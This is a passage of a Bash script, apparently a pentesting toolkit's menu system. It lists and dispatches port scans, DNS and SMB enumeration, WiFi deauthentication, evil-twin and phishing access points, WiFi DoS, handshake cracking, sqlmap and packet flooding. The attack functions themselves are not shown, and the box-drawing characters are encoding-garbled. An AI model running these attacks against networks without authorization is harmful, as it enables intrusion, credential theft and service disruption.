        echo -e "${C_CYAN}â•‘${C_RESET}   ${C_GHOST}[1]${C_RESET} Port Scan (Quick)      ${C_SHADOW}nmap -T4 -F${C_RESET}                     ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}   ${C_GHOST}[2]${C_RESET} Port Scan (Full)       ${C_SHADOW}nmap -sS -sV -sC -A -p-${C_RESET}         ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}   ${C_GHOST}[3]${C_RESET} Port Scan (Stealth)    ${C_SHADOW}nmap -sS -T2 -f${C_RESET}                  ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}   ${C_GHOST}[4]${C_RESET} Port Scan (UDP)        ${C_SHADOW}nmap -sU --top-ports 100${C_RESET}         ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}   ${C_GHOST}[5]${C_RESET} Vulnerability Scan     ${C_SHADOW}nmap --script vuln${C_RESET}               ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}   ${C_GHOST}[6]${C_RESET} Network Discovery      ${C_SHADOW}netdiscover / arp-scan${C_RESET}           ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}   ${C_GHOST}[7]${C_RESET} DNS Enumeration        ${C_SHADOW}dnsenum / dnsrecon${C_RESET}               ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}   ${C_GHOST}[8]${C_RESET} SSL/TLS Analysis       ${C_SHADOW}sslscan / testssl${C_RESET}                ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}   ${C_GHOST}[9]${C_RESET} SNMP Sweep             ${C_SHADOW}onesixtyone${C_RESET}                       ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}   ${C_GHOST}[10]${C_RESET} SMB Enumeration       ${C_SHADOW}enum4linux / smbclient${C_RESET}           ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}   ${C_GHOST}[11]${C_RESET} Masscan (Fast)        ${C_SHADOW}masscan --rate 10000${C_RESET}             ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}                                                                   ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•‘${C_RESET}                      ${C_BLOOD}[B] â† Back${C_RESET}                                 ${C_CYAN}â•‘${C_RESET}"
        echo -e "${C_CYAN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -ne "    ${C_CYAN}â–¶${C_RESET} "
        read -r choice
        
        case "$choice" in
            1)  get_target && run_with_sudo run_nmap_quick ;;
            2)  get_target && run_with_sudo run_nmap_full ;;
            3)  get_target && run_with_sudo run_nmap_stealth ;;
            4)  get_target && run_with_sudo run_nmap_udp ;;
            5)  get_target && run_with_sudo run_nmap_vuln ;;
            6)  run_with_sudo cmd_network_discovery ;;
            7)  run_with_sudo cmd_dns_enum ;;
            8)  run_with_sudo cmd_ssl_analysis ;;
            9)  run_with_sudo cmd_snmp_sweep ;;
            10) run_with_sudo cmd_smb_enum ;;
            11) get_target && run_with_sudo run_masscan ;;
            b|B|back|0) return ;;
            *) log_error "Invalid option" ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

menu_wireless() {
    while true; do
        clear
        echo -e "    ${C_GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}                    ${C_GREEN}ğŸ“¡ WIRELESS ARSENAL${C_RESET}                           ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}                                                                   ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_SHADOW}â”€â”€â”€â”€ Interface Control â”€â”€â”€â”€${C_RESET}                                  ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_GHOST}[1]${C_RESET} Enable Monitor Mode                                        ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_GHOST}[2]${C_RESET} Disable Monitor Mode                                       ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_GHOST}[3]${C_RESET} Channel Hopper                                             ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}                                                                   ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_SHADOW}â”€â”€â”€â”€ Reconnaissance â”€â”€â”€â”€${C_RESET}                                      ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_GHOST}[4]${C_RESET} WiFi Network Scan          ${C_SHADOW}airodump-ng${C_RESET}                    ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_GHOST}[5]${C_RESET} Automated Recon            ${C_SHADOW}wifite${C_RESET}                         ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}                                                                   ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_SHADOW}â”€â”€â”€â”€ Attacks â”€â”€â”€â”€${C_RESET}                                             ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_GHOST}[6]${C_RESET} Deauthentication Attack    ${C_SHADOW}aireplay-ng${C_RESET}                    ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_GHOST}[7]${C_RESET} WPS Attack                 ${C_SHADOW}reaver/bully${C_RESET}                   ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_GHOST}[8]${C_RESET} Handshake Capture          ${C_SHADOW}airodump-ng${C_RESET}                    ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_GHOST}[9]${C_RESET} Evil Twin Attack           ${C_SHADOW}hostapd + captive${C_RESET}              ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}                                                                   ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_SHADOW}â”€â”€â”€â”€ Cracking â”€â”€â”€â”€${C_RESET}                                            ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_GHOST}[10]${C_RESET} Crack Handshake           ${C_SHADOW}aircrack-ng/hashcat${C_RESET}            ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}   ${C_GHOST}[11]${C_RESET} Convert Handshake         ${C_SHADOW}.cap â†’ .hc22000${C_RESET}                ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}                                                                   ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•‘${C_RESET}                      ${C_RED}[B] â† Back${C_RESET}                                   ${C_GREEN}â•‘${C_RESET}"
        echo -e "    ${C_GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -ne "    ${C_CYAN}â–¶${C_RESET} "
        read -r choice
        
        case "$choice" in
            1)  run_with_sudo cmd_monitor_mode_enable ;;
            2)  run_with_sudo cmd_monitor_mode_disable ;;
            3)  run_with_sudo cmd_channel_hop ;;
            4)  run_with_sudo cmd_wifi_scan ;;
            5)  run_with_sudo cmd_wifite ;;
            6)  run_with_sudo cmd_deauth ;;
            7)  run_with_sudo cmd_wps_attack ;;
            8)  run_with_sudo cmd_handshake_capture ;;
            9)  run_with_sudo menu_evil_twin ;;
            10) cmd_crack_handshake ;;
            11) cmd_convert_handshake ;;
            b|B|0) return ;;
            *) log_error "Invalid option" ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

menu_exploit() {
    while true; do
        clear
        echo -e "    ${C_RED}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_RED}â•‘${C_RESET}                     ${C_RED}ğŸ’€ EXPLOIT ARSENAL${C_RESET}                            ${C_RED}â•‘${C_RESET}"
        echo -e "    ${C_RED}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Web Attacks           ${C_SHADOW}nikto, gobuster, nuclei${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} SQL Injection         ${C_SHADOW}sqlmap${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Metasploit Console    ${C_SHADOW}msfconsole${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Exploit Search         ${C_SHADOW}searchsploit${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[B]${C_RESET} Back"
        echo
        echo -ne "    ${C_CYAN}â–¶${C_RESET} "
        read -r choice
        case "$choice" in
            1) menu_web ;;
            2) cmd_sqlmap ;;
            3) cmd_metasploit ;;
            4) cmd_searchsploit ;;
            b|B|0) return ;;
            *) log_error "Invalid option" ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

menu_stress() {
    while true; do
        clear
        echo -e "    ${C_ORANGE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_ORANGE}â•‘${C_RESET}                     ${C_ORANGE}ğŸ”¥ STRESS TESTING${C_RESET}                           ${C_ORANGE}â•‘${C_RESET}"
        echo -e "    ${C_ORANGE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Bandwidth Test         ${C_SHADOW}iperf3${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Packet Flood           ${C_SHADOW}hping3${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} HTTP Load              ${C_SHADOW}ab/hey${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Network Impairment     ${C_SHADOW}tc netem${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[B]${C_RESET} Back"
        echo
        echo -ne "    ${C_CYAN}â–¶${C_RESET} "
        read -r choice
        case "$choice" in
            1) run_with_sudo cmd_iperf3 ;;
            2) run_with_sudo cmd_hping3 ;;
            3) cmd_http_load ;;
            4) run_with_sudo cmd_netem ;;
            b|B|0) return ;;
            *) log_error "Invalid option" ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

menu_tools() {
    while true; do
        clear
        echo -e "    ${C_PURPLE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_PURPLE}â•‘${C_RESET}                      ${C_PURPLE}ğŸ”§ TOOL FORGE${C_RESET}                               ${C_PURPLE}â•‘${C_RESET}"
        echo -e "    ${C_PURPLE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Install Arsenal        ${C_SHADOW}full toolkit${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Install Essentials     ${C_SHADOW}quick setup${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Tool Status            ${C_SHADOW}what's installed${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} View Logs              ${C_SHADOW}latest runs${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Edit Config            ${C_SHADOW}preferences${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[B]${C_RESET} Back"
        echo
        echo -ne "    ${C_CYAN}â–¶${C_RESET} "
        read -r choice
        case "$choice" in
            1) run_with_sudo cmd_install_arsenal ;;
            2) run_with_sudo cmd_install_quick ;;
            3) cmd_tool_status ;;
            4) cmd_view_logs ;;
            5) cmd_config edit ;;
            b|B|0) return ;;
            *) log_error "Invalid option" ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

menu_intel() {
    while true; do
        clear
        echo -e "    ${C_STEEL}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_STEEL}â•‘${C_RESET}                       ${C_STEEL}ğŸ“Š INTEL SUITE${C_RESET}                              ${C_STEEL}â•‘${C_RESET}"
        echo -e "    ${C_STEEL}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} OSINT Recon            ${C_SHADOW}theHarvester, recon-ng${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Traffic Capture        ${C_SHADOW}tcpdump/tshark${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Generate Report        ${C_SHADOW}session artifacts${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[B]${C_RESET} Back"
        echo
        echo -ne "    ${C_CYAN}â–¶${C_RESET} "
        read -r choice
        case "$choice" in
            1) menu_osint ;;
            2) run_with_sudo cmd_traffic_capture ;;
            3) cmd_generate_report ;;
            b|B|0) return ;;
            *) log_error "Invalid option" ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

menu_credentials() {
    menu_creds
}

menu_postexploit() {
    menu_post_exploit
}

menu_port_scan() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_BLOOD}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_BLOOD}â•‘${C_RESET}                    ${C_SKULL}âš” PORT SCANNING${C_RESET}                          ${C_BLOOD}â•‘${C_RESET}"
        echo -e "    ${C_BLOOD}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Quick Scan          ${C_SHADOW}nmap -T4 -F${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Full Scan           ${C_SHADOW}nmap -sS -sV -sC -A -p-${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Stealth Scan        ${C_SHADOW}nmap -sS -T2 -f${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Vuln Scan           ${C_SHADOW}nmap --script vuln${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} UDP Scan            ${C_SHADOW}nmap -sU --top-ports 100${C_RESET}"
        echo -e "    ${C_GHOST}[6]${C_RESET} Masscan             ${C_SHADOW}masscan -p1-65535 --rate=10000${C_RESET}"
        echo -e "    ${C_GHOST}[7]${C_RESET} Service Detection   ${C_SHADOW}nmap -sV --version-intensity 5${C_RESET}"
        echo -e "    ${C_GHOST}[8]${C_RESET} Rustscan            ${C_SHADOW}fast pre-scan + nmap${C_RESET}"
        echo -e "    ${C_GHOST}[9]${C_RESET} Unicornscan         ${C_SHADOW}asynchronous TCP/UDP scan${C_RESET}"
        echo -e "    ${C_GHOST}[10]${C_RESET} Zmap               ${C_SHADOW}internet-wide scan${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) get_target && run_nmap_quick ;;
            2) get_target && run_nmap_full ;;
            3) get_target && run_nmap_stealth ;;
            4) get_target && run_nmap_vuln ;;
            5) get_target && run_nmap_udp ;;
            6) get_target && run_masscan ;;
            7) get_target && run_nmap_service ;;
            8) get_target && run_rustscan ;;
            9) get_target && run_unicornscan ;;
            10) get_target && run_zmap ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_discovery() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_VENOM}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_VENOM}â•‘${C_RESET}                  ${C_SKULL}ğŸ” NETWORK DISCOVERY${C_RESET}                       ${C_VENOM}â•‘${C_RESET}"
        echo -e "    ${C_VENOM}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} ARP Scan            ${C_SHADOW}arp-scan -l${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Ping Sweep          ${C_SHADOW}nmap -sn${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Netdiscover         ${C_SHADOW}netdiscover -r${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} OS Detection        ${C_SHADOW}nmap -O${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Passive Fingerprint ${C_SHADOW}p0f${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) run_arp_scan ;;
            2) get_target && run_ping_sweep ;;
            3) get_target && run_netdiscover ;;
            4) get_target && run_os_detect ;;
            5) run_p0f ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_dns() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_GHOST}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_GHOST}â•‘${C_RESET}                    ${C_SKULL}ğŸŒ DNS ENUMERATION${C_RESET}                        ${C_GHOST}â•‘${C_RESET}"
        echo -e "    ${C_GHOST}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} DNS Enum            ${C_SHADOW}dnsenum${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} DNS Map             ${C_SHADOW}dnsmap${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} DNS Recon           ${C_SHADOW}dnsrecon${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Zone Transfer       ${C_SHADOW}dig axfr${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Subdomain Brute     ${C_SHADOW}fierce${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) get_target && run_dnsenum ;;
            2) get_target && run_dnsmap ;;
            3) get_target && run_dnsrecon ;;
            4) get_target && run_zone_transfer ;;
            5) get_target && run_fierce ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_ssl() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_PURPLE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_PURPLE}â•‘${C_RESET}                    ${C_SKULL}ğŸ” SSL/TLS ANALYSIS${C_RESET}                       ${C_PURPLE}â•‘${C_RESET}"
        echo -e "    ${C_PURPLE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} SSL Scan            ${C_SHADOW}sslscan${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} SSLyze              ${C_SHADOW}sslyze --regular${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} TestSSL             ${C_SHADOW}testssl.sh${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Certificate Info    ${C_SHADOW}openssl s_client${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Heartbleed Check    ${C_SHADOW}nmap --script ssl-heartbleed${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) get_target && run_sslscan ;;
            2) get_target && run_sslyze ;;
            3) get_target && run_testssl ;;
            4) get_target && run_cert_info ;;
            5) get_target && run_heartbleed ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_wifi_recon() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_VENOM}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_VENOM}â•‘${C_RESET}                     ${C_SKULL}ğŸ“¡ WiFi RECON${C_RESET}                            ${C_VENOM}â•‘${C_RESET}"
        echo -e "    ${C_VENOM}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Scan Networks       ${C_SHADOW}airodump-ng${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Wifite Auto         ${C_SHADOW}wifite --kill${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Client Scan         ${C_SHADOW}airodump-ng --bssid${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Hidden SSID         ${C_SHADOW}airodump-ng + deauth${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Signal Strength     ${C_SHADOW}wavemon / iwconfig${C_RESET}"
        echo -e "    ${C_GHOST}[6]${C_RESET} Bettercap Recon     ${C_SHADOW}Live WiFi/ble intel${C_RESET}"
        echo -e "    ${C_GHOST}[7]${C_RESET} Fluxion             ${C_SHADOW}Automated evil twin${C_RESET}"
        echo -e "    ${C_GHOST}[8]${C_RESET} Wifiphisher         ${C_SHADOW}Phishing AP workflow${C_RESET}"
        echo -e "    ${C_GHOST}[9]${C_RESET} MDK3/MDK4 DoS       ${C_SHADOW}WiFi DoS toolkit${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) cmd_wifi_scan ;;
            2) cmd_wifite ;;
            3) cmd_client_scan ;;
            4) cmd_hidden_ssid ;;
            5) cmd_signal_check ;;
            6) cmd_bettercap_wifi ;;
            7) cmd_fluxion ;;
            8) cmd_wifiphisher ;;
            9) cmd_mdk_dos ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_wifi_crack() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_SKULL}â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                      ${C_BLOOD}ğŸ’€ HANDSHAKE CRACKING${C_RESET}                          ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                                                                     ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[1]${C_RESET} Aircrack-ng (CPU)        ${C_SHADOW}Dictionary attack${C_RESET}                     ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[2]${C_RESET} Aircrack-ng (Wordlist)   ${C_SHADOW}Custom wordlist${C_RESET}                      ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[3]${C_RESET} Hashcat (GPU)            ${C_SHADOW}High-speed GPU cracking${C_RESET}               ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[4]${C_RESET} Hashcat (Rules)          ${C_SHADOW}Wordlist + rules${C_RESET}                      ${C_SKULL}â”‚${C_RESET}"
